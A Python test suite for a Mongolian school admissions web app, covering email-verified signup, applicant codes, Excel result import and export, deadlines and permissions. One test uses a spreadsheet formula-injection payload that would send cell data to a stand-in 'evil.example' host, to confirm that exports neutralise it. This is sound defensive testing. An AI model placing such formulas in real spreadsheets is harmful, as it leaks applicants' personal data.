"""Элсэлт: бүртгэл (имэйл код → маягт → элсэгчийн код), нийтийн дүнгийн хуудас, менежерийн Excel дүн оруулах."""

import io
import re
import zipfile
from datetime import UTC, date, datetime, timedelta

import pytest
from openpyxl import Workbook, load_workbook

from app.admissions import mailer, router_public
from tests.helpers import staff_headers


@pytest.fixture
def outbox(monkeypatch):
    """Илгээсэн имэйлүүд: ("code", email, code, lang) | ("confirm", applicant) | ("remind", email, [codes], lang)."""
    router_public._ip_hits.clear()
    sent: list[tuple] = []

    async def code(email, c, lang="mn"):
        sent.append(("code", email, c, lang))

    async def confirm(a, rnd):
        sent.append(("confirm", a))

    async def remind(email, apps, rnd, lang="mn"):
        sent.append(("remind", email, [a.code for a in apps], lang))

    monkeypatch.setattr(mailer, "send_code", code)
    monkeypatch.setattr(mailer, "send_confirmation", confirm)
    monkeypatch.setattr(mailer, "send_reminder", remind)
    return sent


async def manager(client, make_user):
    return await staff_headers(client, make_user, "admin1", roles=("admissions.edit",))


def future(days=7) -> str:
    return (datetime.now(UTC) + timedelta(days=days)).isoformat()


async def make_round(client, h, *, open_=True, grades=(1, 6)):
    r = await client.post("/api/admissions/admin/rounds/", headers=h, json={
        "name": "2027–2028 оны элсэлт", "code_prefix": "su27", "grades": list(grades),
        "test_info": "12-р сарын 6, 10:00, Шинэ Үе сургууль",
    })
    assert r.status_code == 201, r.text
    body = r.json()
    assert body["registration"]["enabled"] is False and body["results"]["enabled"] is False
    patch = {"is_active": True, **({"registration_open": True, "registration_deadline": future()} if open_ else {})}
    r = await client.patch(f"/api/admissions/admin/rounds/{body['id']}/", headers=h, json=patch)
    assert r.status_code == 200, r.text
    return r.json()


async def publish(client, h, rid, **kw):
    r = await client.patch(f"/api/admissions/admin/rounds/{rid}/", headers=h,
                           json={"registration_open": False, "results_published": True, "results_deadline": future(30), **kw})
    assert r.status_code == 200, r.text
    return r.json()


async def expire(db, rid, *fields):
    """Эцсийн хугацааг өнгөрсөн болгоно (API ирээдүйн хугацаа шаарддаг тул шууд баазад)."""
    from app.admissions.models import AdmissionRound
    rnd = await db.get(AdmissionRound, rid)
    for f in fields:
        setattr(rnd, f, datetime.now(UTC) - timedelta(minutes=1))
    await db.commit()


def child(**kw):
    d = {"grade": 1, "child_last_name": "Бат", "child_first_name": "Сараа", "birth_date": "2020-05-01", "gender": "female",
         "current_school": "Нарлаг цэцэрлэг", "guardian_last_name": "Дорж", "guardian_first_name": "Бат", "phone": "99112233",
         "consent": True}
    d.update(kw)
    return d


async def token_for(client, outbox, email="eh@gmail.com"):
    r = await client.post("/api/admissions/email/send/", json={"email": email})
    assert r.status_code == 200, r.text
    code = next(c[2] for c in reversed(outbox) if c[0] == "code" and c[1] == email)
    r = await client.post("/api/admissions/email/verify/", json={"email": email, "code": code})
    assert r.status_code == 200, r.text
    return r.json()["token"]


async def apply(client, outbox, email="eh@gmail.com", **kw):
    token = await token_for(client, outbox, email)
    return await client.post("/api/admissions/applications/", json={"token": token, **child(**kw)})


async def test_info_without_round(client):
    r = await client.get("/api/admissions/")
    assert r.status_code == 200 and r.json() == {"round": None}


async def test_full_signup_gives_random_code_and_confirmation(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h)
    r = await apply(client, outbox)
    assert r.status_code == 201, r.text
    body = r.json()
    assert re.fullmatch(r"SU27-[2-9A-HJ-NP-Z]{5}", body["code"])
    assert body["grade"] == 1 and "12-р сарын 6" in body["test_info"]
    assert outbox[-1][0] == "confirm" and outbox[-1][1].code == body["code"]


async def test_sibling_same_email_ok_but_same_child_twice_rejected(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h)
    assert (await apply(client, outbox)).status_code == 201
    assert (await apply(client, outbox, child_first_name="Тэмүүлэн", birth_date="2014-03-02", grade=6)).status_code == 201
    r = await apply(client, outbox)
    assert r.status_code == 400 and "аль хэдийн" in r.text


async def test_rejects_grade_not_in_round_closed_round_and_missing_consent(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h)
    assert (await apply(client, outbox, grade=3)).status_code == 400
    assert (await apply(client, outbox, consent=False)).status_code == 400
    r = await client.post("/api/admissions/applications/", json={"token": "bad", **child()})
    assert r.status_code == 401


async def test_registration_switched_off_does_not_send_codes(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h, open_=False)
    r = await client.post("/api/admissions/email/send/", json={"email": "eh@gmail.com"})
    assert r.status_code == 400 and "хаалттай" in r.text and outbox == []
    assert (await client.get("/api/admissions/")).json()["round"]["registration"] == {"open": False, "deadline": None}


async def test_wrong_code_counts_attempts(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h)
    await client.post("/api/admissions/email/send/", json={"email": "eh@gmail.com"})
    r = await client.post("/api/admissions/email/verify/", json={"email": "eh@gmail.com", "code": "000000"})
    assert r.status_code == 400


async def test_remind_always_ok_and_mails_only_registered(client, make_user, outbox):
    h = await manager(client, make_user)
    await make_round(client, h)
    code = (await apply(client, outbox)).json()["code"]
    assert (await client.post("/api/admissions/codes/remind/", json={"email": "nobody@gmail.com"})).json() == {"ok": True}
    assert (await client.post("/api/admissions/codes/remind/", json={"email": "EH@gmail.com"})).json() == {"ok": True}
    assert outbox[-1] == ("remind", "eh@gmail.com", [code], "mn")


def results_xlsx(rows) -> bytes:
    wb = Workbook()
    ws = wb.active
    ws.append(("Код", "Анги", "Нэр", "Оноо", "Дүн"))
    for r in rows:
        ws.append(r)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


async def test_results_hidden_until_published_and_never_expose_names(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    a = (await apply(client, outbox)).json()["code"]
    b = (await apply(client, outbox, email="nuguu@gmail.com", child_first_name="Анар")).json()["code"]
    await apply(client, outbox, email="gurav@gmail.com", child_first_name="Гэрэл")   # дүн оруулаагүй → нийтлэгдэхгүй
    up = await client.post(f"/api/admissions/admin/rounds/{rnd['id']}/results/", headers=h,
                           files={"file": ("r.xlsx", results_xlsx([(a, 1, "x", 84.5, "Тэнцсэн"), (b, 1, "x", "61", "нөөц")]))})
    assert up.status_code == 200 and up.json()["applied"] and up.json()["updated"] == 2, up.text

    assert (await client.get("/api/admissions/results/")).json()["rows"] == []
    await publish(client, h, rnd["id"])
    res = (await client.get("/api/admissions/results/")).json()
    assert res["published_at"] and res["rows"] == [
        {"code": c, "grade": 1, "score": s, "result": r} for c, s, r in sorted([(a, 84.5, "passed"), (b, 61.0, "waitlist")])
    ]
    raw = (await client.get("/api/admissions/results/")).text
    for secret in ("Сараа", "Анар", "Бат", "gmail", "99112233", "2020-05-01"):
        assert secret not in raw


async def test_import_is_all_or_nothing(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    a = (await apply(client, outbox)).json()["code"]
    bad = results_xlsx([(a, 1, "x", 90, "Тэнцсэн"), ("SU27-ZZZZZ", 1, "x", 50, "Тэнцээгүй"), (a.lower(), 1, "x", "abc", "")])
    r = (await client.post(f"/api/admissions/admin/rounds/{rnd['id']}/results/", headers=h, files={"file": ("r.xlsx", bad)})).json()
    assert r["applied"] is False and len(r["errors"]) == 2
    apps = (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=h)).json()
    assert apps[0]["score"] is None and apps[0]["result"] is None


async def test_export_round_trips_into_import(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    code = (await apply(client, outbox)).json()["code"]
    x = await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants.xlsx", headers=h)
    assert x.status_code == 200
    wb = load_workbook(io.BytesIO(x.content))
    ws = wb.active
    header = [c.value for c in ws[1]]
    assert ws.cell(2, 1).value == code and "Сараа" in [c.value for c in ws[2]]
    ws.cell(2, header.index("Оноо") + 1, 77)
    ws.cell(2, header.index("Дүн") + 1, "Тэнцсэн")
    buf = io.BytesIO()
    wb.save(buf)
    r = (await client.post(f"/api/admissions/admin/rounds/{rnd['id']}/results/", headers=h,
                           files={"file": ("r.xlsx", buf.getvalue())})).json()
    assert r["applied"] and r["updated"] == 1


async def test_admin_requires_admissions_section(client, make_user):
    h = await staff_headers(client, make_user, "olymp", roles=("olympiad.edit",))
    assert (await client.get("/api/admissions/admin/rounds/", headers=h)).status_code == 403
    h = await staff_headers(client, make_user, "viewer", roles=("admissions.view",))
    assert (await client.get("/api/admissions/admin/rounds/", headers=h)).status_code == 200
    r = await client.post("/api/admissions/admin/rounds/", headers=h, json={"name": "x", "code_prefix": "SU27", "grades": [1]})
    assert r.status_code == 403
    assert (await client.get("/api/admissions/admin/rounds/")).status_code == 401


async def test_withdrawn_applicant_hidden_from_results(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    await apply(client, outbox)
    app_id = (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=h)).json()[0]["id"]
    await client.patch(f"/api/admissions/admin/applicants/{app_id}/", headers=h, json={"score": 50, "result": "failed"})
    await client.patch(f"/api/admissions/admin/applicants/{app_id}/", headers=h, json={"status": "withdrawn"})
    await publish(client, h, rnd["id"])
    assert (await client.get("/api/admissions/results/")).json()["rows"] == []


def test_birth_date_validation():
    from pydantic import ValidationError

    from app.admissions.schemas import ApplicationIn
    with pytest.raises(ValidationError):
        ApplicationIn(token="t", **child(birth_date=date.today().isoformat()))


# ---------- Бүртгэл / дүн: асаах-унтраах товч + эцсийн хугацаа ----------

async def test_enabling_requires_future_deadline(client, make_user):
    h = await manager(client, make_user)
    rnd = await make_round(client, h, open_=False)
    url = f"/api/admissions/admin/rounds/{rnd['id']}/"
    r = await client.patch(url, headers=h, json={"registration_open": True})
    assert r.status_code == 400 and "registration_deadline" in r.json()
    past = (datetime.now(UTC) - timedelta(hours=1)).isoformat()
    assert (await client.patch(url, headers=h, json={"results_published": True, "results_deadline": past})).status_code == 400
    r = await client.patch(url, headers=h, json={"registration_open": True, "registration_deadline": future(3)})
    assert r.status_code == 200 and r.json()["registration"]["enabled"] is True and r.json()["results"]["enabled"] is False


async def test_only_one_section_can_be_on(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)   # бүртгэл асаалттай
    url = f"/api/admissions/admin/rounds/{rnd['id']}/"
    # бүртгэл асаалттай үед дүнг асааж болохгүй — бүртгэл хэвээр
    r = await client.patch(url, headers=h, json={"results_published": True, "results_deadline": future(30)})
    assert r.status_code == 400 and "results_published" in r.json()
    adm = (await client.get("/api/admissions/admin/rounds/", headers=h)).json()[0]
    assert adm["registration"]["enabled"] is True and adm["results"]["enabled"] is False
    # бүртгэлийг унтрааж дүнг асаавал болно; тэгээд бүртгэлийг асааж болохгүй
    r = await client.patch(url, headers=h, json={"registration_open": False})
    r = await client.patch(url, headers=h, json={"results_published": True, "results_deadline": future(30)})
    assert r.status_code == 200 and r.json()["results"]["enabled"] is True and r.json()["registration"]["enabled"] is False
    r = await client.patch(url, headers=h, json={"registration_open": True, "registration_deadline": future(3)})
    assert r.status_code == 400 and "registration_open" in r.json()
    info = (await client.get("/api/admissions/")).json()["round"]
    assert info["registration"]["open"] is False and info["results"]["open"] is True and info["test_info"] == ""
    assert (await client.post("/api/admissions/email/send/", json={"email": "eh@gmail.com"})).status_code == 400


async def test_database_rejects_both_on(db):
    from sqlalchemy.exc import IntegrityError

    from app.admissions.models import AdmissionRound
    db.add(AdmissionRound(name="x", code_prefix="SU99", grades=[1], registration_open=True, results_published=True))
    with pytest.raises(IntegrityError):
        await db.flush()
    await db.rollback()


async def test_registration_deadline_passing_switches_it_off(client, make_user, outbox, db):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    token = await token_for(client, outbox)
    await expire(db, rnd["id"], "registration_deadline")
    # сайтаас шууд алга болно, бүртгэл хүлээж авахгүй
    assert (await client.get("/api/admissions/")).json()["round"]["registration"]["open"] is False
    r = await client.post("/api/admissions/applications/", json={"token": token, **child()})
    assert r.status_code == 400
    # админы самбарт автоматаар унтарсан, хугацаа өнгөрсөн гэж харагдана
    adm = (await client.get("/api/admissions/admin/rounds/", headers=h)).json()[0]["registration"]
    assert adm["enabled"] is False and adm["expired"] is True
    # админ шинэ хугацаа тавьж дахин асаах хүртэл хаалттай
    r = await client.patch(f"/api/admissions/admin/rounds/{rnd['id']}/", headers=h, json={"registration_open": True})
    assert r.status_code == 400
    r = await client.patch(f"/api/admissions/admin/rounds/{rnd['id']}/", headers=h,
                           json={"registration_open": True, "registration_deadline": future(2)})
    assert r.json()["registration"] == {"enabled": True, "deadline": r.json()["registration"]["deadline"], "expired": False}
    assert (await client.get("/api/admissions/")).json()["round"]["registration"]["open"] is True


async def test_results_deadline_passing_hides_results(client, make_user, outbox, db):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    code = (await apply(client, outbox)).json()["code"]
    apps = (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=h)).json()
    await client.patch(f"/api/admissions/admin/applicants/{apps[0]['id']}/", headers=h, json={"score": 80, "result": "passed"})
    await publish(client, h, rnd["id"])
    assert [r["code"] for r in (await client.get("/api/admissions/results/")).json()["rows"]] == [code]
    await expire(db, rnd["id"], "results_deadline")
    res = (await client.get("/api/admissions/results/")).json()
    assert res["rows"] == [] and res["round"]["results"]["open"] is False
    adm = (await client.get("/api/admissions/admin/rounds/", headers=h)).json()[0]
    assert adm["results"]["enabled"] is False and adm["results"]["expired"] is True and adm["results_published_at"]


async def test_inactive_round_shows_nothing_even_if_switched_on(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    await client.patch(f"/api/admissions/admin/rounds/{rnd['id']}/", headers=h, json={"is_active": False})
    assert (await client.get("/api/admissions/")).json() == {"round": None}


# ---- англи хувилбар ----

async def test_english_round_texts_fall_back_to_mongolian(client, make_user):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    r = await client.get("/api/admissions/?lang=en")
    assert r.json()["round"]["name"] == "2027–2028 оны элсэлт"          # англи хоосон → монгол
    r = await client.patch(f"/api/admissions/admin/rounds/{rnd['id']}/", headers=h,
                           json={"name_en": "  2027–2028 admission ", "test_info_en": "6 December, 10:00"})
    assert r.status_code == 200 and r.json()["name_en"] == "2027–2028 admission"
    en = (await client.get("/api/admissions/?lang=en")).json()["round"]
    assert en["name"] == "2027–2028 admission" and en["test_info"] == "6 December, 10:00"
    mn = (await client.get("/api/admissions/")).json()["round"]
    assert mn["name"] == "2027–2028 оны элсэлт" and mn["test_info"].startswith("12-р сарын 6")


async def test_english_signup_messages_and_applicant_language(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    await client.patch(f"/api/admissions/admin/rounds/{rnd['id']}/", headers=h, json={"name_en": "2027 admission"})
    r = await client.post("/api/admissions/email/send/", json={"email": "bad", "lang": "en"})
    assert r.json() == {"email": ["Invalid email address"]}
    r = await client.post("/api/admissions/email/send/", json={"email": "en@gmail.com", "lang": "en"})
    assert r.status_code == 200 and outbox[-1][3] == "en"
    r = await client.post("/api/admissions/email/verify/", json={"email": "en@gmail.com", "code": "000000", "lang": "en"})
    assert r.json() == {"code": ["Incorrect code"]}
    code = outbox[-1][2]
    token = (await client.post("/api/admissions/email/verify/", json={"email": "en@gmail.com", "code": code})).json()["token"]
    r = await client.post("/api/admissions/applications/", json={"token": token, "lang": "en", **child(phone="12")})
    assert r.json()["phone"] == ["Invalid phone number."]
    r = await client.post("/api/admissions/applications/", json={"token": token, "lang": "en", **child(grade=3)})
    assert r.json() == {"grade": ["Grade 3 is not part of this admission"]}
    r = await client.post("/api/admissions/applications/", json={"token": token, "lang": "en", **child()})
    assert r.status_code == 201 and r.json()["round_name"] == "2027 admission"
    confirmed = next(m[1] for m in outbox if m[0] == "confirm")
    assert confirmed.lang == "en"
    listed = (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=h)).json()
    assert listed[0]["lang"] == "en"
    await client.post("/api/admissions/codes/remind/", json={"email": "en@gmail.com", "lang": "en"})
    assert outbox[-1][0] == "remind" and outbox[-1][3] == "en"
    r = await client.post("/api/admissions/applications/", json={"token": "bad", "lang": "en", **child()})
    assert r.status_code == 401 and "expired" in r.json()["detail"]


async def test_english_emails(monkeypatch):
    from app.admissions.models import AdmissionRound, Applicant
    out = []

    async def capture(m):
        out.append(m)

    monkeypatch.setattr(mailer, "_send", capture)
    rnd = AdmissionRound(name="2027 элсэлт", name_en="2027 admission", test_info="Мягмар", test_info_en="Tuesday")
    a = Applicant(code="SU27-ABCDE", email="x@gmail.com", child_last_name="Bat", child_first_name="Saraa", grade=1, lang="en")
    await mailer.send_confirmation(a, rnd)
    await mailer.send_code("x@gmail.com", "123456", "en")
    await mailer.send_reminder("x@gmail.com", [a], rnd, "en")
    a.lang = "mn"
    await mailer.send_confirmation(a, rnd)
    texts = [m.get_content() for m in out]
    assert "registered for grade 1 in “2027 admission”" in texts[0] and "Tuesday" in texts[0] and "Shine Ue School" in texts[0]
    assert "123456" in texts[1] and "valid for" in texts[1]
    assert "SU27-ABCDE — Bat Saraa, grade 1" in texts[2]
    assert "«2027 элсэлт»-д 1-р ангид" in texts[3] and "Мягмар" in texts[3]


async def test_export_never_writes_public_input_as_excel_formula(client, make_user, outbox):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    evil = '=HYPERLINK("http://evil.example/?x="&K2,"Дэлгэрэнгүй")'
    r = await apply(client, outbox, child_first_name=evil, current_school="=1+1", guardian_last_name="@SUM(A1)", phone="+976 99112233")
    assert r.status_code == 201, r.text
    x = await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants.xlsx", headers=h)
    assert b"<f>" not in zipfile.ZipFile(io.BytesIO(x.content)).read("xl/worksheets/sheet1.xml")
    ws = load_workbook(io.BytesIO(x.content)).active
    row = {c.value: i for i, c in enumerate(ws[1])}
    assert ws[2][row["Нэр"]].value == evil and ws[2][row["Нэр"]].data_type == "s"
    # Excel дээр нүдийг засах үед ч томъёо болохгүй (quotePrefix)
    assert ws[2][row["Нэр"]].quotePrefix and ws[2][row["Утас"]].quotePrefix
    assert not ws[2][row["Овог"]].quotePrefix


async def test_export_requires_edit_permission(client, make_user):
    h = await manager(client, make_user)
    rnd = await make_round(client, h)
    v = await staff_headers(client, make_user, "viewer1", roles=("admissions.view",))
    assert (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=v)).status_code == 200
    r = await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants.xlsx", headers=v)
    assert r.status_code == 403 and r.json() == {"detail": "Танд энэ хэсгийг зөвхөн харах эрх байна."}
